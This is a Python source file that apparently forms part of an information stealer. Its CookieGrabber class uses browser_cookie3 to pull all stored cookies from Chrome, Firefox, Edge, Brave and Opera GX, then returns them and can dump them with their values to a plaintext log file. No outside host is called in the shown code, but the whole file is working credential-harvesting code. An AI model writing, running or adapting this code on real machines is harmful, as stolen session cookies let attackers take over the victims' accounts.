import browser_cookie3

class CookieGrabber:
    def __init__(self, log_cookies_in_txt, logs_file_name: str):
        self.log_cookies = log_cookies_in_txt
        self.logs_file_name = logs_file_name

    def start(self):
        try:
            valid_cookies = {}
            valid_chrome_cookies = {}
            valid_firefox_cookies = {}
            valid_edge_cookies = {}
            valid_brave_cookies = {}
            valid_operagx_cookies = {}

            try:
                chrome_cookies = browser_cookie3.chrome()

                for cookie in chrome_cookies:
                    valid_chrome_cookies[f"{cookie.domain} | {cookie.name}"] = cookie.value
            except Exception as e:
                print("ERROR")
                print(e)

            try:
                firefox_cookies = browser_cookie3.firefox()

                for cookie in firefox_cookies:
                    valid_firefox_cookies[f"{cookie.domain} | {cookie.name}"] = cookie.value
            except Exception as e:
                print("ERROR")
                print(e)
            
            try:
                edge_cookies = browser_cookie3.edge()
            
                for cookie in edge_cookies:
                    valid_edge_cookies[f"{cookie.domain} | {cookie.name}"] = cookie.value
            except Exception as e:
                print("ERROR")
                print(e)
            
            try:
                brave_cookies = browser_cookie3.brave()
            
                for cookie in brave_cookies:
                    valid_brave_cookies[f"{cookie.domain} | {cookie.name}"] = cookie.value
            except Exception as e:
                print("ERROR")
                print(e)
            
            try:
                operagx_cookies = browser_cookie3.opera_gx()
            
                for cookie in operagx_cookies:
                    valid_operagx_cookies[cookie.domain] = cookie.value
            except Exception as e:
                print("ERROR")
                print(e)
            
        except Exception as e:
            print("ERROR")
            print(e)
        
        valid_cookies["chrome"] = valid_chrome_cookies
        valid_cookies["firefox"] = valid_firefox_cookies
        valid_cookies["edge"] = valid_edge_cookies
        valid_cookies["brave"] = valid_brave_cookies
        valid_cookies["operagx"] = valid_operagx_cookies

        if self.log_cookies == True or self.log_cookies == "true" or self.log_cookies == "True":
            with open(self.logs_file_name, "w") as f:
                for browser in valid_cookies:
                    f.write(f"#### {browser} ####\n")
                    
                    for cookie in valid_cookies[browser]:
                        f.write(f"{cookie} ===> {valid_cookies[browser][cookie]}\n")
                    f.write("\n\n\n\n")

        return valid_cookies

#grabber = CookieGrabber(True, "logs.txt")
#cookies = grabber.start()
#print(cookies)